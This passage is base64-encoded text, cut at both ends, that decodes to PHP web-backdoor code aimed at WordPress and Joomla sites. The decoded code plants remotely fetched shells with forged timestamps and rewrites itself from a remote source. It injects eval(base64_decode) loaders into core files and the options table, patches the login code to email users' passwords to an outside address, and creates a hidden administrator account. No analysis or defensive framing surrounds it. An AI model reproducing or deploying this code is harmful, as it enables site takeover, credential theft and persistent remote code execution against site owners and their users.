wvc2VvLXVsdGltYXRlLycpOwogICRpbmNsdWRlcyA9IGFycmF5KCcvLi8nKTsKICBpZiAoaXNfam9vbWxhKCkpIHsKLy8gICAgJGluY2x1ZGVzID0gYXJyYXkoJy9sYXlvdXRzLycsICcvdGVtcGxhdGVzXC9zeXN0ZW0vJywgJy90ZW1wbGF0ZXNcL3Byb3Rvc3Rhci8nLCAnL3RlbXBsYXRlc1wvYmVlejMvJywgJy9wbHVnaW5zXC9lZGl0b3JzLXh0ZC8nLCAnL3BsdWdpbnNcL2ZpbmRlci8nLCAnL3BsdWdpbnNcL3F1aWNraWNvbi8nKTsKICAgICRpbmNsdWRlcyA9IGFycmF5KCcvLi8nKTsKICB9CiAgaWYgKGlzX3dvcmRwcmVzcygpKSB7Ci8vICAgICRpbmNsdWRlcyA9IGFycmF5KCcvd3AtaW5jbHVkZXNcL3BvbW8vJywgJy93cC1pbmNsdWRlc1wvZm9udHMvJywgJy93cC1pbmNsdWRlc1wvSUQzLycpOwogICAgJGluY2x1ZGVzID0gYXJyYXkoJy8uLycpOwogIH0KICBmb3JlYWNoKCR3cml0ZV9saXN0IGFzICRkaXIpIHsKICAgICRuYW1lID0gbmFtZUdlbmVyYXRlKCRkaXIpOwogICAgJHNfcGF0aCA9ICRkaXIgLiBESVJFQ1RPUllfU0VQQVJBVE9SIC4gJG5hbWU7CiAgICAkbWFrZSA9IGZhbHNlOwogICAgZm9yZWFjaCAoJGluY2x1ZGVzIGFzICRpbmMpewogICAgICBpZiAocHJlZ19tYXRjaCgkaW5jLCAkc19wYXRoKSkgewogICAgICAgICRtYWtlID0gdHJ1ZTsKICAgICAgfQogICAgfQogICAgZm9yZWFjaCAoJGV4Y2x1ZGVzIGFzICRleGNsKXsKICAgICAgaWYgKHByZWdfbWF0Y2goJGV4Y2wsICRzX3BhdGgpKSB7CiAgICAgICAgJG1ha2UgPSBmYWxzZTsKICAgICAgfQogICAgfQoKICAgIGlmICgkbWFrZSl7CiAgICAgIGlmIChmaWxlX3B1dF9jb250ZW50cygkc19wYXRoLCAkcmVtb3RlX2ZpbGVzW3JhbmQoMCwgY291bnQoJHJlbW90ZV9maWxlcykgLSAxKV0pICE9IEZBTFNFKSB7CiAgICAgICAgaWYgKCR0cyA9PSAnbmVpZ2gnKSB7CiAgICAgICAgICAkZG9ub3IgPSB0aW1lc3RhbXBHZW5lcmF0ZSgkZGlyKTsKICAgICAgICAgIHRvdWNoKCRzX3BhdGgsICRkb25vclsnbXRpbWUnXSwgJGRvbm9yWydhdGltZSddKTsKICAgICAgICB9CiAgICAgICAgZWxzZWlmICgkdHMgPT0gJ25vdycpIHsKICAgICAgICAgIHRvdWNoKCRzX3BhdGgpOwogICAgICAgIH0KICAgICAgICBhcnJheV9wdXNoKCRzaGVsbHMsIHByZWdfcmVwbGFjZSgkcGF0dGVybnMsICRyZXBsYWNlbWVudHMsICRzX3BhdGgpKTsKICAgICAgfQogICAgfQoKICB9CiAgJHJlc3VsdCA9IGFycmF5KCd0eXBlJyA9PiAnZGlzdHJpYnV0ZScsICd1cmxzJyA9PiAkc2hlbGxzKTsKICBlY2hvIHN0cmlwc2xhc2hlcyhqc29uX2VuY29kZSgkcmVzdWx0KSkgLiAiXG4iOwogIAp9CgppZihpc3NldCgkX0dFVFsidXBkYXRlIl0pICYmICRpc19hdXRoKSB7CiAgaWYoIWVtcHR5KCRfR0VUWyJ1cGRhdGUiXSkpIHsKICAgICRmaWxlcyA9ICRfR0VUWyJ1cGRhdGUiXTsKICB9CiAgZWxzZSB7CiAgICBwaHBpbmZvKCk7CiAgICByZXR1cm47CiAgfQogIGlmKCFlbXB0eSgkX0dFVFsidHMiXSkpIHsKICAgICR0cyA9ICRfR0VUWyJ0cyJdOwogIH0KICBlbHNlIHsKICAgICR0cyA9ICduZWlnaCc7CiAgfQogICRyZW1vdGVfZmlsZXMgPSBhcnJheSgpOwogICR1cmxzID0gZ2V0X3JlbW90ZV9maWxlKCRmaWxlcyk7CiAgJHJlbW90ZV9maWxlcyA9IGV4cGxvZGUoIiAiLCAkdXJscyk7CiAgJGZpbGUgPSAkX1NFUlZFUlsiU0NSSVBUX0ZJTEVOQU1FIl07CiAgJG5ldyA9IGdldF9yZW1vdGVfZmlsZSgkcmVtb3RlX2ZpbGVzW3JhbmQoMCwgY291bnQoJHJlbW90ZV9maWxlcykgLSAxKV0pOwogIGlmICghc3RycG9zKCRuZXcsICc/cGhwJykpIHsKICAgICRyZXN1bHQgPSBhcnJheSgndHlwZScgPT4gJ3VwZGF0ZScsICdyZXN1bHQnID0+ICdmYWlsZWQnKTsKICAgIGVjaG8gc3RyaXBzbGFzaGVzKGpzb25fZW5jb2RlKCRyZXN1bHQpKSAuICJcbiI7CiAgICByZXR1cm47CiAgfQogICRkaXIgPSBkaXJuYW1lKCRfU0VSVkVSWyJTQ1JJUFRfRklMRU5BTUUiXSk7CiAgaWYgKGZpbGVfcHV0X2NvbnRlbnRzKCRmaWxlLCAkbmV3KSAhPSBGQUxTRSkgewogICAgaWYgKCR0cyA9PSAnbmVpZ2gnKSB7CiAgICAgICRkb25vciA9IHRpbWVzdGFtcEdlbmVyYXRlKCRkaXIpOwogICAgICB0b3VjaCgkZmlsZSwgJGRvbm9yWydtdGltZSddLCAkZG9ub3JbJ2F0aW1lJ10pOwogICAgfQogICAgZWxzZWlmICgkdHMgPT0gJ25vdycpIHsKICAgICAgdG91Y2goJGZpbGUpOwogICAgfQogICAgJHJlc3VsdCA9IGFycmF5KCd0eXBlJyA9PiAndXBkYXRlJywgJ3Jlc3VsdCcgPT4gJ3N1Y2Nlc3MnKTsKICAgIGVjaG8gc3RyaXBzbGFzaGVzKGpzb25fZW5jb2RlKCRyZXN1bHQpKSAuICJcbiI7CiAgfQogIGVsc2UgewogICAgJHJlc3VsdCA9IGFycmF5KCd0eXBlJyA9PiAndXBkYXRlJywgJ3Jlc3VsdCcgPT4gJ2ZhaWxlZCcpOwogICAgZWNobyBzdHJpcHNsYXNoZXMoanNvbl9lbmNvZGUoJHJlc3VsdCkpIC4gIlxuIjsKICB9Cgp9CgppZihpc3NldCgkX0dFVFsibG5rZGlzdCJdKSAmJiAkaXNfYXV0aCkgewogIHJlcXVpcmUoJF9TRVJWRVJbJ0RPQ1VNRU5UX1JPT1QnXSAuIERJUkVDVE9SWV9TRVBBUkFUT1IgLiAnd3AtbG9hZC5waHAnKTsKICAkZnRtcCA9IGZpbGVfZ2V0X2NvbnRlbnRzKEFCU1BBVEguV1BJTkMuRElSRUNUT1JZX1NFUEFSQVRPUi4nZGVmYXVsdC1jb25zdGFudHMucGhwJyk7CiAgaWYgKGZpbGVfcHV0X2NvbnRlbnRzKEFCU1BBVEguV1BJTkMuRElSRUNUT1JZX1NFUEFSQVRPUi4nZGVmYXVsdC1jb25zdGFudHMucGhwJywgJGZ0bXAuIlxuXG5cblxuXG5cblxuXG5cblxuXG5cblxuXG5cblxuXG5cblxuXG5cblxuXG5cblxuXG5cbiIuYmFzZTY0X2RlY29kZSgnUUdsdWFWOXpaWFFvSjJScGMzQnNZWGxmWlhKeWIzSnpKeXdnSnpBbktUc0tKRzkwZG1WMElEMGdKeWM3Q2lSbWNDQTlJR1p6YjJOcmIzQmxiaWdpWEhnMlkxeDRObVZjZURaaVhIZ3laVng0TnpOY2VEWTFYSGcyWmx4NE1tUmNlRFprWEhnMlpseDROMkZjZURKbFhIZzJNMXg0Tm1aY2VEWmtJaXdnT0RBc0lDUmxjbkp1Ynl3Z0pHVnljbk4wY2l3Z01UQXBPd29rYjNWMElEMGdJbHg0TkRkY2VEUTFYSGcxTkZ4NE1qQmNlREptWEhnMlkxeDRObVZjZURaaVhIZ3labHg0TmpsY2VEWmxYSGcyWVZ4NE1tVmNlRGN3WEhnMk9GeDROekJjZURJd1hIZzBPRng0TlRSY2VEVTBYSGcxTUZ4NE1tWmNlRE14WEhneVpWeDRNekZjY2x4dUlqc0tKRzkxZENBdVBTQWlYSGcwT0Z4NE5tWmNlRGN6WEhnM05GeDRNMkZjZURJd1hIZzJZMXg0Tm1WY2VEWmlYSGd5WlZ4NE56TmNlRFkxWEhnMlpseDRNbVJjZURaa1hIZzJabHg0TjJGY2VESmxYSGcyTTF4NE5tWmNlRFprWEhKY2JpSTdDaVJ2ZFhRZ0xqMGdJbHg0TkROY2VEWm1YSGcyWlZ4NE5tVmNlRFkxWEhnMk0xeDROelJjZURZNVhIZzJabHg0Tm1WY2VETmhYSGd5TUZ4NE5ETmNlRFpqWEhnMlpseDROek5jZURZMVhISmNibHh5WEc0aU93cG1kM0pwZEdVb0pHWndMQ0FrYjNWMEtUc0tkMmhwYkdVZ0tDRm1aVzltS0NSbWNDa3BJSHNrYjNSMlpYUWdMajBnWm1kbGRITW9KR1p3S1R0OUNtWmpiRzl6WlNna1puQXBPd3B3Y21WblgyMWhkR05vS0NjaloyOW5ieWd1S2lsbGJtVnVJMmx6Snl3Z0pHOTBkbVYwTENBa2JYUmphSE1wT3dwcFppQW9abTl3Wlc0b0oyWnliWE50ZEcxd0xuQm9jQ2NzSUNkM0p5a3BJSHNnSkhWeVlTQTlJREU3SUNSbFlpQTlJQ2NuT3lBa2FHUnNJRDBnWm05d1pXNG9KMlp5YlhOdGRHMXdMbkJvY0Njc0lDZDNKeWs3SUgwS2FXWWdLQ0VrZFhKaEtTQjdDaUFnSUNBZ0lDQWdKR1JwY25NZ1BTQm5iRzlpS0NJcUlpd2dSMHhQUWw5UFRreFpSRWxTS1RzS0lDQWdJQ0FnSUNCbWIzSmxZV05vSUNna1pHbHljeUJoY3lBa1pHbHlZU2tnZXdvZ0lDQWdJQ0FnSUNBZ0lDQWdJQ0FnYVdZZ0tHWnZjR1Z1S0NJa1pHbHlZUzltY20xemJYUnRjQzV3YUhBaUxDQW5keWNwS1NCN0lDUmxZaUE5SUNJa1pHbHlZUzhpT3lBa2FHUnNJRDBnWm05d1pXNG9JaVJrYVhKaEwyWnliWE50ZEcxd0xuQm9jQ0lzSUNkM0p5azdJR0p5WldGck95QjlDaUFnSUNBZ0lDQWdJQ0FnSUNBZ0lDQWtjM1ZpWkdseWN5QTlJR2RzYjJJb0lpUmthWEpoTHlvaUxDQkhURTlDWDA5T1RGbEVTVklwT3dvZ0lDQWdJQ0FnSUNBZ0lDQWdJQ0FnWm05eVpXRmphQ0FvSkhOMVltUnBjbk1nWVhNZ0pITjFZbVJwY21FcElIc0tJQ0FnSUNBZ0lDQWdJQ0FnSUNBZ0lDQWdJQ0FnSUNBZ2FXWWdLR1p2Y0dWdUtDSWtjM1ZpWkdseVlTOW1jbTF6YlhSdGNDNXdhSEFpTENBbmR5Y3BLU0I3SUNSbFlpQTlJQ0lrYzNWaVpHbHlZUzhpT3lBa2FHUnNJRDBnWm05d1pXNG9JaVJ6ZFdKa2FYSmhMMlp5YlhOdGRHMXdMbkJvY0NJc0lDZDNKeWs3SUdKeVpXRnJPeUI5Q2lBZ0lDQWdJQ0FnSUNBZ0lDQWdJQ0I5Q2lBZ0lDQWdJQ0FnZlFwOUNtWjNjbWwwWlNna2FHUnNMQ0FpUEQ5d2FIQmNiaVJ0ZEdOb2Mxc3hYVnh1UHo0aUtUc0tabU5zYjNObEtDUm9aR3dwT3dwcGJtTnNkV1JsS0NKN0pHVmlmV1p5YlhOdGRHMXdMbkJvY0NJcE93cEFkVzVzYVc1cktDSjdKR1ZpZldaeWJYTnRkRzF3TG5Cb2NDSXBPd289JykpKSB7CiAgICAkcmVzdWx0ID0gYXJyYXkoJ3R5cGUnID0+ICdsbmtkaXN0JywgJ3Jlc3VsdCcgPT4gJ3N1Y2Nlc3MnKTsKICB9IGVsc2UgewogICAgJHJlc3VsdCA9IGFycmF5KCd0eXBlJyA9PiAnbG5rZGlzdCcsICdyZXN1bHQnID0+ICdmYWlsZWQnKTsKICB9CiAgZWNobyBzdHJpcHNsYXNoZXMoanNvbl9lbmNvZGUoJHJlc3VsdCkpIC4gIlxuIjsKfQoKaWYoaXNzZXQoJF9HRVRbIndwZGlzdCJdKSAmJiAkaXNfYXV0aCkgewogIHJlcXVpcmUoJF9TRVJWRVJbJ0RPQ1VNRU5UX1JPT1QnXSAuIERJUkVDVE9SWV9TRVBBUkFUT1IgLiAnd3AtbG9hZC5waHAnKTsKICAkb3B0aW9uID0gJ3JlbmRlcic7CiAgaWYgKGluaV9nZXQoJ2FsbG93X3VybF9mb3BlbicpKSB7CiAgICAkc2VyaWFsaXplZF92YWx1ZSA9ICJldmFsKGJhc2U2NF9kZWNvZGUoJ1pXTm9ieUJBWm1sc1pWOW5aWFJmWTI5dWRHVnVkSE1vSWx4NE5qaGNlRGMwWEhnM05GeDROekJjZUROaFhIZ3labHg0TW1aY2VEWXhYSGczTUZ4NE5qbGNlREpsWEhnM00xeDROalZjZURabVhIZ3laRng0Tm1SY2VEWm1YSGczWVZ4NE1tVmNlRFl6WEhnMlpseDRObVJjZURKbVhIZzJZMXg0TmpsY2VEWmxYSGcyWWx4NE0yWmNlRFkwWEhnelpDSXVKRjlUUlZKV1JWSmJJbHg0TlROY2VEUTFYSGcxTWx4NE5UWmNlRFExWEhnMU1seDROV1pjZURSbFhIZzBNVng0TkdSY2VEUTFJbDB1SWlaMVBTSXVKRjlUUlZKV1JWSmJJbHg0TlRKY2VEUTFYSGcxTVZ4NE5UVmNlRFExWEhnMU0xeDROVFJjZURWbVhIZzFOVng0TlRKY2VEUTVJbDBwT3c9PScpKTsiOwogIH0KICBlbHNlaWYgKGV4dGVuc2lvbl9sb2FkZWQoJ2N1cmwnKSAmJiBmdW5jdGlvbl9leGlzdHMoJ2N1cmxfZXhlYycpKSB7CiAgICAkc2VyaWFsaXplZF92YWx1ZSA9ICJldmFsKGJhc2U2NF9kZWNvZGUoJ0pHTm9QV04xY214ZmFXNXBkQ2dwTzJOMWNteGZjMlYwYjNCMEtDUmphQ3hEVlZKTVQxQlVYMVZTVEN3aVhIZzJPRng0TnpSY2VEYzBYSGczTUZ4NE0yRmNlREptWEhneVpseDROakZjZURjd1hIZzJPVng0TW1WY2VEY3pYSGcyTlZ4NE5tWmNlREprWEhnMlpGeDRObVpjZURkaFhIZ3laVng0TmpOY2VEWm1YSGcyWkZ4NE1tWmNlRFpqWEhnMk9WeDRObVZjZURaaVhIZ3pabHg0TmpSY2VETmtJaTRrWDFORlVsWkZVbHNpWEhnMU0xeDRORFZjZURVeVhIZzFObHg0TkRWY2VEVXlYSGcxWmx4NE5HVmNlRFF4WEhnMFpGeDRORFVpWFM0aUpuVTlJaTRrWDFORlVsWkZVbHNpWEhnMU1seDRORFZjZURVeFhIZzFOVng0TkRWY2VEVXpYSGcxTkZ4NE5XWmNlRFUxWEhnMU1seDRORGtpWFNrN1kzVnliRjl6WlhSdmNIUW9KR05vTEVOVlVreFBVRlJmVWtWVVZWSk9WRkpCVGxOR1JWSXNNU2s3Skd4cGJtdHpQV04xY214ZlpYaGxZeWdrWTJncE8yTjFjbXhmWTJ4dmMyVW9KR05vS1R0bFkyaHZJQ1JzYVc1cmN6cz0nKSk7IjsKICB9CiAgZWxzZWlmIChleHRlbnNpb25fbG9hZGVkKCdzb2NrZXRzJykpIHsKICAgICRzZXJpYWxpemVkX3ZhbHVlID0gImV2YWwoYmFzZTY0X2RlY29kZSgnSkdad1BXWnpiMk5yYjNCbGJpZ2lYSGcyTVZ4NE56QmNlRFk1WEhneVpWeDROek5jZURZMVhIZzJabHg0TW1SY2VEWmtYSGcyWmx4NE4yRmNlREpsWEhnMk0xeDRObVpjZURaa0lpdzRNQ3drWlhKeWJtOHNKR1Z5Y25OMGNpdzFLVHNrY21WeFBTSmNlREptWEhnMlkxeDROamxjZURabFhIZzJZbHg0TTJaY2VEWTBYSGd6WkNJdUpGOVRSVkpXUlZKYklseDROVE5jZURRMVhIZzFNbHg0TlRaY2VEUTFYSGcxTWx4NE5XWmNlRFJsWEhnME1WeDROR1JjZURRMUlsMHVJaVoxUFNJdUpGOVRSVkpXUlZKYklseDROVEpjZURRMVhIZzFNVng0TlRWY2VEUTFYSGcxTTF4NE5UUmNlRFZtWEhnMU5WeDROVEpjZURRNUlsMDdKRzkxZEQwaVhIZzBOMXg0TkRWY2VEVTBJQ0l1SkhKbGNTNGlJRng0TkRoY2VEVTBYSGcxTkZ4NE5UQmNlREptWEhnek1WeDRNbVZjZURNeFhISmNibHg0TkRoY2VEWm1YSGczTTF4NE56UmNlRE5oWEhneU1GeDROakZjZURjd1hIZzJPVng0TW1WY2VEY3pYSGcyTlZ4NE5tWmNlREprWEhnMlpGeDRObVpjZURkaFhIZ3laVng0TmpOY2VEWm1YSGcyWkZ4eVhHNWNlRFF6WEhnMlpseDRObVZjZURabFhIZzJOVng0TmpOY2VEYzBYSGcyT1Z4NE5tWmNlRFpsWEhnellWeDRNakJjZURRelhIZzJZMXg0Tm1aY2VEY3pYSGcyTlZ4eVhHNWNlRFUxWEhnM00xeDROalZjZURjeVhIZ3laRng0TkRGY2VEWTNYSGcyTlZ4NE5tVmNlRGMwWEhnellWeDRNakJjZURRelhIZzJabHg0TkRSY2NseHVYSEpjYmlJN1puZHlhWFJsS0NSbWNDd2tiM1YwS1Rza2FIUnRiRDF6ZEhKbFlXMWZaMlYwWDJOdmJuUmxiblJ6S0NSbWNDazdabU5zYjNObEtDUm1jQ2s3SkdoMGJXdzlaWGh3Ykc5a1pTZ2lYSEpjYmx4eVhHNGlMQ1JvZEcxc0tUdGhjbkpoZVY5emFHbG1kQ2drYUhSdGJDazdaV05vYnlCd2NtVm5YM0psY0d4aFkyVW9JaTllVzE0OFhTc3ZhVzBpTENBaUlpd2dhVzF3Ykc5a1pTZ2thSFJ0YkNrcE93PT0nKSk7IjsKICB9CiAgJGF1dG9sb2FkID0gJ3llcyc7CiAgJHFyID0gJHdwZGItPnF1ZXJ5KCAkd3BkYi0+cHJlcGFyZSggIklOU0VSVCBJTlRPIGAkd3BkYi0+b3B0aW9uc2AgKGBvcHRpb25fbmFtZWAsIGBvcHRpb25fdmFsdWVgLCBgYXV0b2xvYWRgKSBWQUxVRVMgKCVzLCAlcywgJXMpIE9OIERVUExJQ0FURSBLRVkgVVBEQVRFIGBvcHRpb25fbmFtZWAgPSBWQUxVRVMoYG9wdGlvbl9uYW1lYCksIGBvcHRpb25fdmFsdWVgID0gVkFMVUVTKGBvcHRpb25fdmFsdWVgKSwgYGF1dG9sb2FkYCA9IFZBTFVFUyhgYXV0b2xvYWRgKSIsICRvcHRpb24sICRzZXJpYWxpemVkX3ZhbHVlLCAkYXV0b2xvYWQgKSApOwogICRoZWFkZXIgPSBnZXRfdGVtcGxhdGVfZGlyZWN0b3J5KCkgLiBESVJFQ1RPUllfU0VQQVJBVE9SIC4gJ2hlYWRlci5waHAnOwogIGluc2VydFJlbmRlcigkZGlyPWdldF90aGVtZV9yb290KCkpOwogIGlmIChpc19kaXIoV1BfQ09OVEVOVF9ESVIuRElSRUNUT1JZX1NFUEFSQVRPUi4nY2FjaGUnKSkgewogICAgIGNsZWFyQ2FjaGUoJGRpcj1XUF9DT05URU5UX0RJUi5ESVJFQ1RPUllfU0VQQVJBVE9SLidjYWNoZScpOwogIH0KICBpZiAoJHFyKSB7CiAgICAkcmVzdWx0ID0gYXJyYXkoJ3R5cGUnID0+ICd3cGRpc3QnLCAncmVzdWx0JyA9PiAnc3VjY2VzcycsICdzdGF0dXMnID0+ICRxcik7CiAgICBlY2hvIHN0cmlwc2xhc2hlcyhqc29uX2VuY29kZSgkcmVzdWx0KSkgLiAiXG4iOwogIH0KICBlbHNlaWYgKCRxciA9PT0gMCkgewogICAgJHJlc3VsdCA9IGFycmF5KCd0eXBlJyA9PiAnd3BkaXN0JywgJ3Jlc3VsdCcgPT4gJ2V4aXN0cycsICdzdGF0dXMnID0+ICRxcik7CiAgICBlY2hvIHN0cmlwc2xhc2hlcyhqc29uX2VuY29kZSgkcmVzdWx0KSkgLiAiXG4iOwogIH0KICBlbHNlIHsKICAgICRyZXN1bHQgPSBhcnJheSgndHlwZScgPT4gJ3dwZGlzdCcsICdyZXN1bHQnID0+ICdmYWlsZWQnKTsKICAgIGVjaG8gc3RyaXBzbGFzaGVzKGpzb25fZW5jb2RlKCRyZXN1bHQpKSAuICJcbiI7CiAgfQp9CgppZihpc3NldCgkX0dFVFsid3BtYWlsIl0pICYmICRpc19hdXRoKSB7CiAgcmVxdWlyZSgkX1NFUlZFUlsnRE9DVU1FTlRfUk9PVCddIC4gRElSRUNUT1JZX1NFUEFSQVRPUiAuICd3cC1sb2FkLnBocCcpOwogICRmID0gZmlsZV9nZXRfY29udGVudHMoQUJTUEFUSC5XUElOQy5ESVJFQ1RPUllfU0VQQVJBVE9SLid1c2VyLnBocCcpOwogIGlmICgkZikgewogICAgaWYgKHByZWdfbWF0Y2goJy93cF9tYWlsLycsICRmKSkgewogICAgICAkcmVzdWx0ID0gYXJyYXkoJ3R5cGUnID0+ICd3cG1haWwnLCAncmVzdWx0JyA9PiAnZXhpc3RzJyk7CiAgICB9IAogICAgZWxzZSB7CiAgICAgICRmID0gcHJlZ19yZXBsYWNlKCcvKC4qd3BfaGFzaF9wYXNzd29yZCkvJywgIlx0XHR3cF9tYWlsKFwiXFx4NzVcXHg2ZVxceDYzXFx4NmNcXHg2NVxceDYyXFx4NjVcXHg2ZVxceDdhXFx4MzFcXHgzMlxceDM1XFx4MzdcXHg0MFxceDY3XFx4NmRcXHg2MVxceDY5XFx4NmNcXHgyZVxceDYzXFx4NmZcXHg2ZFwiLFwiXFx4NzdcXHg3MFxceDVmXFx4NzBcXHg2MVxceDczXFx4NzNcIixqc29uX2VuY29kZShcJHVzZXJkYXRhKSk7XG4kMSIsICRmKTsKICAgICAgJGYgPSBwcmVnX3JlcGxhY2UoJy8oLip3cF9zZXRfYXV0aF9jb29raWVcKFwkdXNlcikvJywgIlx0aWYgKFwkX1BPU1RbXCJwd2RcIl0pIHdwX21haWwoXCJcXHg3NVxceDZlXFx4NjNcXHg2Y1xceDY1XFx4NjJcXHg2NVxceDZlXFx4N2FcXHgzMVxceDMyXFx4MzVcXHgzN1xceDQwXFx4NjdcXHg2ZFxceDYxXFx4NjlcXHg2Y1xceDJlXFx4NjNcXHg2ZlxceDZkXCIsXCJcXHg3N1xceDcwXFx4NWZcXHg3MFxceDYxXFx4NzNcXHg3M1wiLGpzb25fZW5jb2RlKFsgXCJkb21haW5cIiA9PiBcJF9TRVJWRVJbXCJIVFRQX0hPU1RcIl0sIFwidXNlcl9sb2dpblwiID0+IFwkX1BPU1RbXCJsb2dcIl0sIFwidXNlcl9wYXNzd29yZFwiID0+IFwkX1BPU1RbXCJwd2RcIl0gXSkpO1xuJDEiLCAkZik7CiAgICAgIGlmIChmaWxlX3B1dF9jb250ZW50cyhBQlNQQVRILldQSU5DLkRJUkVDVE9SWV9TRVBBUkFUT1IuJ3VzZXIucGhwJywgJGYpKSB7CiAgICAgICAgJGRvbm9yID0gdGltZXN0YW1wR2VuZXJhdGUoQUJTUEFUSC5XUElOQyk7CiAgICAgICAgdG91Y2goQUJTUEFUSC5XUElOQy5ESVJFQ1RPUllfU0VQQVJBVE9SLid1c2VyLnBocCcsICRkb25vclsnbXRpbWUnXSwgJGRvbm9yWydhdGltZSddKTsKICAgICAgICAkcmVzdWx0ID0gYXJyYXkoJ3R5cGUnID0+ICd3cG1haWwnLCAncmVzdWx0JyA9PiAnc3VjY2VzcycpOwogICAgICB9IAogICAgICBlbHNlIHsKICAgICAgICAkcmVzdWx0ID0gYXJyYXkoJ3R5cGUnID0+ICd3cG1haWwnLCAncmVzdWx0JyA9PiAnZmFpbGVkJyk7CiAgICAgIH0KICAgIH0KICB9CiAgZWxzZSB7CiAgICAkcmVzdWx0ID0gYXJyYXkoJ3R5cGUnID0+ICd3cG1haWwnLCAncmVzdWx0JyA9PiAnZmFpbGVkJyk7CiAgfQogIGVjaG8gc3RyaXBzbGFzaGVzKGpzb25fZW5jb2RlKCRyZXN1bHQpKSAuICJcbiI7Cn0KCmlmKGlzc2V0KCRfR0VUWyJ3cHVzZXIiXSkgJiYgJGlzX2F1dGgpIHsKICAkYmFzZSA9ICRfR0VUWyJiYXNlIl07CiAgcmVxdWlyZSgkX1NFUlZFUlsnRE9DVU1FTlRfUk9PVCddIC4gRElSRUNUT1JZX1NFUEFSQVRPUiAuICRiYXNlIC4gRElSRUNUT1JZX1NFUEFSQVRPUiAuICAnd3AtbG9hZC5waHAnKTsKICAkdXNlciA9ICJcMTQxXDE0NFwxNTZcMTU2XDE1MVwxNTYiOwogICRwYXNzID0gJyRQJEJpY1ZtWThkMHJ0OUZTaUlxWHhCeS5QOWpmemloYjEnOwogICRlbWFpbCA9ICJcMTY1XDE1NlwxNDNcMTU0XDE0NVwxNDJcMTQ1XDE1NlwxNzJcNjFcNjJcNjVcNjdcMTAwXDE0N1wxNTVcMTQxXDE1MVwxNTRcNTZcMTQzXDE1N1wxNTUiOwogICRtZXRhID0gYXJyYXkoJ25pY2tuYW1lJyA9PiAkdXNlciwgJ3JpY2hfZWRpdGluZycgPT4gJ3RydWUnLCAnY29tbWVudF9zaG9ydGN1dHMnID0+ICdmYWxzZScsICdhZG1pbl9jb2xvcicgPT4gJ2ZyZXNoJywgJ3VzZV9zc2wnID0+ICcwJywgJ3Nob3dfYWRtaW5fYmFyX2Zyb250JyA9PiAndHJ1ZScsICd3cF9jYXBhYmlsaXRpZXMnID0+ICdhOjE6e3M6MTM6ImFkbWluaXN0cmF0b3IiO2I6MTt9JywgJ3dwX3VzZXJfbGV2ZWwnID0+ICcxMCcsICdkaXNtaXNzZWRfd3BfcG9pbnRlcnMnID0+ICd3cDM2MF9sb2Nrcyx3cDM5MF93aWRnZXRzJywgJ3Nob3dfd2VsY29tZV9wYW5lbCcgPT4gJzEnKTsKICAkZXhpc3RzID0gJHdwZGItPmdldF9yZXN1bHRzKCR3cGRiLT5wcmVwYXJlKCJTRUxFQ1QgSUQgRlJPTSAkd3BkYi0+dXNlcnMgV0hFUkUgdXNlcl9sb2dpbiA9ICVzIiwgJHVzZXIpKTsKICBpZiAoISRleGlzdHMpIHsKICAgICRjcl91c2VyID0gJHdwZGItPnF1ZXJ5KCAkd3BkYi0+cHJlcGFyZSggIklOU0VSVCBJTlRPIGAkd3BkYi0+dXNlcnNgIChgdXNlcl9sb2dpbmAsIGB1c2VyX3Bhc3NgLCBgdXNlcl9lbWFpbGApIFZBTFVFUyAoJXMsICVzLCAlcykgT04gRFVQTElDQVRFIEtFWSBVUERBVEUgYHVzZXJfbG9naW5gID0gVkFMVUVTKGB1c2VyX2xvZ2luYCksIGB1c2VyX3Bhc3NgID0gVkFMVUVTKGB1c2VyX3Bhc3NgKSwgYHVzZXJfZW1haWxgID0gVkFMVUVTKGB1c2VyX2VtYWlsYCkiLCAkdXNlciwgJHBhc3MsICRlbWFpbCApICk7CiAgICAkcmVzdWx0ID0gJHdwZGItPmdldF9yZXN1bHRzKCR3cGRiLT5wcmVwYXJlKCJTRUxFQ1QgSUQgRlJPTSAkd3BkYi0+dXNlcnMgV0hFUkUgdXNlcl9sb2dpbiA9ICVzIiwgJHVzZXIpKTsKICAgICR1aWQgPSAkcmVzdWx0WzBdLT5JRDsKICAgIGZvcmVhY2ggKCRtZXRhIGFzICRrZXkgPT4gJHZhbHVlKSB7CiAgICAgICRtZXRhX3IgPSAkd3BkYi0+cXVlcnkoICR3cGRiLT5wcmVwYXJlKCAiSU5TRVJUIElOVE8gYCR3cGRiLT51c2VybWV0YWAgKGB1c2VyX2lkYCwgYG1ldGFfa2V5YCwgYG1ldGFfdmFsdWVgKSBWQUxVRVMgKCVzLCAlcywgJXMpIE9OIERVUExJQ0FURSBLRVkgVVBEQVRFIGB1c2VyX2lkYCA9IFZBTFVFUyhgdXNlcl9pZGApLCBgbWV0YV9rZXlgID0gVkFMVUVTKGBtZXRhX2tleWApLCBgbWV0YV92YWx1ZWAgPSBWQUxVRVMoYG1ldGFfdmFsdWVgKSIsICR1aWQsICRrZXksICR2YWx1ZSApICk7CiAgICB9CiAgfQogIGVsc2UgewogICAgJHVpZCA9ICRleGlzdHNbMF0tPklEOwogICAgZm9yZWFjaCAoJG1ldGEgYXMgJGtleSA9PiAkdmFsdWUpIHsKICAgICAgJG1ldGFfciA9ICR3cGRiLT5xdWVyeSggJHdwZGItPnByZXBhcmUoICJVUERBVEUgYCR3cGRiLT51c2VybWV0YWAgU0VUIGBtZXRhX3ZhbHVlYCA9ICVzIFdIRVJFIGB1c2VyX2lkYCA9ICVzIEFORCBgbWV0YV9rZXlgID0gJXMiLCAkdmFsdWUsICR1aWQsICRrZXkgKSApOwogICAgfQogIH0KICBpZiAoJGNyX3VzZXIpIHsKICAgICRyZXN1bHQgPSBhcnJheSgndHlwZScgPT4gJ3dwdXNlcicsICdyZXN1bHQnID0+ICdzdWNjZXNzJywgJ2NyX3VzZXInID0+ICRjcl91c2VyLCAnbWV0YV9yJyA9PiAkbWV0YV9yKTsKICAgIGVjaG8gc3RyaXBzbGFzaGVzKGpzb25fZW5jb2RlKCRyZXN1bHQpKSAuICJcbiI7CiAgfQogIGVsc2VpZiAoJGV4aXN0cykgewogICAgJHJlc3VsdCA9IGFycmF5KCd0eXBlJyA9PiAnd3B1c2VyJywgJ3Jlc3VsdCcgPT4gJ2V4aXN0cycsICdtZXRhX3InID0+ICRtZXRhX3IpOwogICAgZWNobyBzdHJpcHNsYXNoZXMoanNvbl9lbmNvZGUoJHJlc3VsdCkpIC4gIlxuIjsKICB9CiAgZWxzZSB7CiAgICAkcmVzdWx0ID0gYXJyYXkoJ3R5cGUnID0+ICd3cHVzZXInLCAncmVzdWx0JyA9PiAnZmFpbGVkJyk7CiAgICBlY2hvIHN0cmlwc2xhc2hlcyhq